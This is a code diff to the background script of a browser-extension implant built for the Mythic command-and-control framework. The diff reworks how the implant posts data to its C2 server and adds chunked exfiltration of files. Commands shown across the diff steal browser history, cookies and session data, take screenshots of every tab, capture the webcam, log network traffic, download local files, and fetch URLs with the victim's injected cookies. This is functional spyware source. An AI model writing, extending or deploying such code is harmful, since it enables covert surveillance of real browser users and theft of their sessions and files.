@@ -122,13 +122,13 @@ async function sendToMythic(actionObj) {
     try {
       const resp = await fetch(HTTP_C2_URL, {
         method:  "POST",
-        headers: { "Content-Type": "application/json" },
-        body:    packet
+        headers: { "Content-Type": "text/plain" },
+        body:    b64
       });
       if (resp.ok) {
         const text = await resp.text();
         if (text && text.trim()) {
-          handleMythicMessage(text).catch(() => {});
+          await handleMythicMessage(text);
         }
       }
       return;
@@ -157,8 +157,8 @@ async function sendRawToMythic(b64data) {
     try {
       const resp = await fetch(HTTP_C2_URL, {
         method:  "POST",
-        headers: { "Content-Type": "application/json" },
-        body:    packet
+        headers: { "Content-Type": "text/plain" },
+        body:    b64data
       });
       if (resp.ok) {
         const text = await resp.text();
@@ -281,26 +281,67 @@ function postResponse(taskId, output, completed = true) {
   }).catch(() => {});
 }
 
-// postFile: single-step upload — include chunk_data in the same message as the
-// registration. Mythic creates the file and links it to the task row in one shot,
-// producing the download arrow without a round-trip for file_id.
+// postFile: agent→Mythic download. Register (no chunk_data), then send chunks
+// after Mythic returns file_id. Putting chunk_data on the register message makes
+// Mythic store user_output as the task download instead of the file.
+const _FILE_SEND_CHUNK = 512000; // decoded bytes; Mythic default
+const _pendingFileSends = new Map(); // task_id → {filename, chunks, nextChunk, consoleMsg, isScreenshot, fileId}
+
+function splitFileToB64Chunks(base64data, chunkSize = _FILE_SEND_CHUNK) {
+  const bytes = base64ToBytes(base64data || "");
+  const chunks = [];
+  for (let i = 0; i < bytes.length; i += chunkSize) {
+    chunks.push(bytesToBase64(bytes.subarray(i, Math.min(i + chunkSize, bytes.length))));
+  }
+  return chunks.length ? chunks : [""];
+}
+
 function postFile(taskId, filename, base64data, isScreenshot = false, consoleMsg = "") {
+  const chunks = splitFileToB64Chunks(base64data);
+  _pendingFileSends.set(taskId, {
+    filename, chunks, nextChunk: 1, consoleMsg, isScreenshot, fileId: null
+  });
   sendToMythic({
     action:    "post_response",
     responses: [{
       task_id:   taskId,
-      completed: true,
-      user_output: consoleMsg,
+      completed: false,
       download: {
-        total_chunks:  1,
-        chunk_num:     1,
-        chunk_data:    base64data,
+        total_chunks:  chunks.length,
+        chunk_size:    _FILE_SEND_CHUNK,
         filename:      filename,
-        full_path:     "",
+        full_path:     filename,
         is_screenshot: isScreenshot,
         host:          ""
       }
     }],
+    delegates: []
+  }).catch(() => {
+    _pendingFileSends.delete(taskId);
+    postResponse(taskId, consoleMsg || `Failed to send ${filename}`);
+  });
+}
+
+function sendPendingFileChunk(taskId) {
+  const pending = _pendingFileSends.get(taskId);
+  if (!pending || !pending.fileId) return;
+  const idx  = pending.nextChunk;
+  const last = idx >= pending.chunks.length;
+  pending.nextChunk = idx + 1;
+  if (last) _pendingFileSends.delete(taskId);
+  const resp = {
+    task_id:   taskId,
+    completed: last,
+    download: {
+      file_id:    pending.fileId,
+      chunk_num:  idx,
+      chunk_data: pending.chunks[idx - 1]
+    }
+  };
+  if (last) resp.user_output = pending.consoleMsg;
+  sendToMythic({
+    action:    "post_response",
+    responses: [resp],
     delegates: []
   }).catch(() => {});
 }
@@ -413,8 +454,12 @@ async function checkIn() {
 async function handleMythicMessage(rawData) {
   let msg;
   try {
-    const wrapper = JSON.parse(rawData);
-    msg = await decryptFromMythic(wrapper.data);
+    let b64 = String(rawData).trim();
+    try {
+      const wrapper = JSON.parse(rawData);
+      if (wrapper && typeof wrapper.data === "string") b64 = wrapper.data;
+    } catch (_) { /* HTTP profile returns raw base64 */ }
+    msg = await decryptFromMythic(b64);
   } catch (e) {
     return;
   }
@@ -450,10 +495,20 @@ async function handleMythicMessage(rawData) {
       break;
     }
     case "post_response": {
-      // Mythic upload protocol: chunk_data is at the TOP LEVEL of each response
-      // object, NOT nested inside an r.upload sub-object.
-      // Structure: {task_id, status, file_id, total_chunks, chunk_data}
+      // Register ack is {task_id, status, file_id} with no chunk_data.
+      // Mythic→agent upload still uses top-level chunk_data (fetchFileViaMythicC2).
       for (const r of (msg.responses || [])) {
+        const sending = _pendingFileSends.get(r.task_id);
+        if (sending && !r.chunk_data) {
+          if (r.file_id) sending.fileId = r.file_id;
+          if (r.status === "error" && !sending.fileId) {
+            _pendingFileSends.delete(r.task_id);
+            postResponse(r.task_id, sending.consoleMsg || "File transfer failed");
+            continue;
+          }
+          if (sending.fileId) sendPendingFileChunk(r.task_id);
+          continue;
+        }
         if (!r.chunk_data) continue;
         const pending = _pendingUploads.get(r.task_id);
         if (!pending) continue;
@@ -731,7 +786,7 @@ function cmdHistory(task, params) {
     } else {
       const b64 = bytesToBase64(new TextEncoder().encode(lines.join("\n")));
       postFile(task.id, "history.txt", b64, false,
-        `History: ${lines.length} entries — click the file icon on this task row to download history.txt`);
+        `History: ${lines.length} entries — Search Files (history.txt)`);
     }
   });
 }
@@ -798,6 +853,10 @@ function cmdScreenshot(task) {
       postResponse(task.id, "Cannot screenshot this tab: " + tab.url);
       return;
     }
+    let origin = "";
+    try { origin = new URL(tab.url).origin; } catch (_) {}
+    const hostname = (origin || "tab").replace(/^https?:\/\//, "").replace(/[^a-z0-9]/gi, "_");
+    const fname = `screenshot_${hostname}_${Date.now()}.png`;
 
     // Capture the composited page (GPU video frames are blank at this stage)
     const dataUrl = await new Promise(res =>
@@ -837,8 +896,8 @@ function cmdScreenshot(task) {
 
     if (!videoFrames.length) {
       // No videos or all DRM — ship the plain screenshot
-      postFile(task.id, "screenshot.png", dataUrl.split(",")[1] || "", false,
-               "Screenshot captured — use the download arrow on this task row");
+      postFile(task.id, fname, dataUrl.split(",")[1] || "", true,
+               `Screenshot captured — Search Files (${fname})`);
       return;
     }
 
@@ -862,12 +921,12 @@ function cmdScreenshot(task) {
         reader.onloadend = () => res(reader.result.split(',')[1] || "");
         reader.readAsDataURL(outBlob);
       });
-      postFile(task.id, "screenshot.png", b64, false,
-               "Screenshot captured — use the download arrow on this task row");
+      postFile(task.id, fname, b64, true,
+               `Screenshot captured — Search Files (${fname})`);
     } catch (e) {
       // Compositing failed — fall back to plain screenshot
-      postFile(task.id, "screenshot.png", dataUrl.split(",")[1] || "", false,
-               "Screenshot captured (video overlay failed: " + e.message + ")");
+      postFile(task.id, fname, dataUrl.split(",")[1] || "", true,
+               "Screenshot captured (video overlay failed: " + e.message + `) — Search Files (${fname})`);
     }
   });
 }
@@ -1044,7 +1103,7 @@ function cmdDownloadHistory(task, params) {
     } else {
       const b64 = bytesToBase64(new TextEncoder().encode(lines.join("\n")));
       postFile(task.id, "download_history.txt", b64, false,
-        `Download history: ${lines.length} entries — use the download arrow on this task row`);
+        `Download history: ${lines.length} entries — Search Files (download_history.txt)`);
     }
   });
 }
@@ -1212,7 +1271,7 @@ function cmdNetworkMonitorStop(task) {
   } else {
     const b64 = bytesToBase64(new TextEncoder().encode(lines.join("\n")));
     postFile(task.id, "network_log.txt", b64, false,
-      `Network log: ${lines.length} entries — use the download arrow on this task row`);
+      `Network log: ${lines.length} entries — Search Files (network_log.txt)`);
   }
 }
 // __ENDCMD__
@@ -1254,8 +1313,9 @@ async function cmdSessionExport(task, params) {
   };
   const hostname = origin.replace(/^https?:\/\//, "").replace(/[^a-z0-9]/gi, "_");
   const b64 = bytesToBase64(new TextEncoder().encode(JSON.stringify(session, null, 2)));
-  postFile(task.id, `session_${hostname}_${Date.now()}.json`, b64, false,
-    `Session exported for ${origin} — use the download arrow on this task row`);
+  const fname = `session_${hostname}_${Date.now()}.json`;
+  postFile(task.id, fname, b64, false,
+    `Session exported for ${origin} — Search Files (${fname})`);
 }
 // __ENDCMD__
 
@@ -1266,12 +1326,40 @@ async function cmdDownloadUrl(task, params) {
   try { opts = params ? JSON.parse(params) : {}; } catch (_) {}
   const url = opts.url || (typeof params === "string" ? params.trim() : "");
   if (!url.startsWith("http")) { postResponse(task.id, "download_url requires a url parameter"); return; }
-  const filename = opts.filename || url.split("/").pop().split("?")[0] || "download";
+  let origin = "";
+  try { origin = new URL(url).origin; } catch (_) {}
+  const hostname = (origin || "download").replace(/^https?:\/\//, "").replace(/[^a-z0-9]/gi, "_");
+  const base = opts.filename || url.split("/").pop().split("?")[0] || "download";
+  const filename = `download_${hostname}_${Date.now()}_${base}`;
+  let dnrId = 0;
   try {
     const cookieStr = await new Promise(res => chrome.cookies.getAll({ url }, c =>
       res(chrome.runtime.lastError || !c?.length ? "" : c.map(x => `${x.name}=${x.value}`).join("; "))));
+    // MV3 fetch() drops Cookie. Session DNR sets it on this request; header fallback if DNR fails.
+    let host = "";
+    try { host = new URL(url).hostname; } catch (_) {}
+    if (cookieStr && host && chrome.declarativeNetRequest?.updateSessionRules) {
+      dnrId = 1 + Math.floor(Math.random() * 900000);
+      try {
+        await chrome.declarativeNetRequest.updateSessionRules({
+          removeRuleIds: [dnrId],
+          addRules: [{
+            id: dnrId,
+            priority: 1,
+            action: {
+              type: "modifyHeaders",
+              requestHeaders: [{ header: "cookie", operation: "set", value: cookieStr }]
+            },
+            condition: {
+              requestDomains: [host],
+              resourceTypes: ["xmlhttprequest", "other"]
+            }
+          }]
+        });
+      } catch (_) { dnrId = 0; }
+    }
     const hdrs = {};
-    if (cookieStr) hdrs["Cookie"] = cookieStr;
+    if (cookieStr && !dnrId) hdrs["Cookie"] = cookieStr;
     const resp = await fetch(url, { credentials: "omit", headers: hdrs, cache: "no-cache" });
     if (!resp.ok) { postResponse(task.id, `Fetch failed: HTTP ${resp.status}`); return; }
     const buf = await resp.arrayBuffer();
@@ -1281,8 +1369,13 @@ async function cmdDownloadUrl(task, params) {
     for (let i = 0; i < bytes.length; i += chunk)
       bin += String.fromCharCode.apply(null, bytes.subarray(i, Math.min(i + chunk, bytes.length)));
     postFile(task.id, filename, btoa(bin), false,
-      `Downloaded ${filename} (${bytes.length} bytes) — use the download arrow on this task row`);
+      `Downloaded ${filename} (${bytes.length} bytes) — Search Files (${filename})`);
   } catch (e) { postResponse(task.id, "download_url error: " + e.message); }
+  finally {
+    if (dnrId && chrome.declarativeNetRequest?.updateSessionRules) {
+      try { await chrome.declarativeNetRequest.updateSessionRules({ removeRuleIds: [dnrId] }); } catch (_) {}
+    }
+  }
 }
 // __ENDCMD__
 
@@ -1401,9 +1494,10 @@ async function cmdScreenshotAll(task, params) {
     }
 
     parts.push("</body></html>");
+    const fname = `screenshots_${Date.now()}.html`;
     const b64 = bytesToBase64(new TextEncoder().encode(parts.join("\n")));
-    postFile(task.id, `screenshots_${Date.now()}.html`, b64, false,
-      `Captured ${captured}/${total} tabs — use the download arrow on this task row`);
+    postFile(task.id, fname, b64, false,
+      `Captured ${captured}/${total} tabs — Search Files (${fname})`);
   } catch (e) { postResponse(task.id, "screenshot_all error: " + e.message); }
 }
 // __ENDCMD__
@@ -1496,8 +1590,9 @@ async function cmdWebcam(task) {
     } else if (String(val).startsWith("__ERR__")) {
       postResponse(task.id, "Webcam error: " + String(val).slice(7));
     } else {
-      postFile(task.id, `webcam_${Date.now()}.png`, val, false,
-        "Webcam snapshot captured — use the download arrow on this task row");
+      const fname = `webcam_${Date.now()}.png`;
+      postFile(task.id, fname, val, true,
+        `Webcam snapshot captured — Search Files (${fname})`);
     }
   } catch (e) {
     postResponse(task.id, "Webcam failed: " + (e.message || String(e)));
@@ -2230,7 +2325,8 @@ async function cmdFileDownload(task, params) {
     const r = await _fileChunkedDownload(path, 300000);
     if (r.error) { postResponse(task.id, "error: " + r.error); return; }
     const fname = path.split(/[/\\]/).pop();
-    postFile(task.id, fname, r.data, false);
+    postFile(task.id, fname, r.data, false,
+      `Downloaded ${fname} — Search Files (${fname})`);
   } catch (e) { postResponse(task.id, "file_download failed: " + e.message); }
 }
 
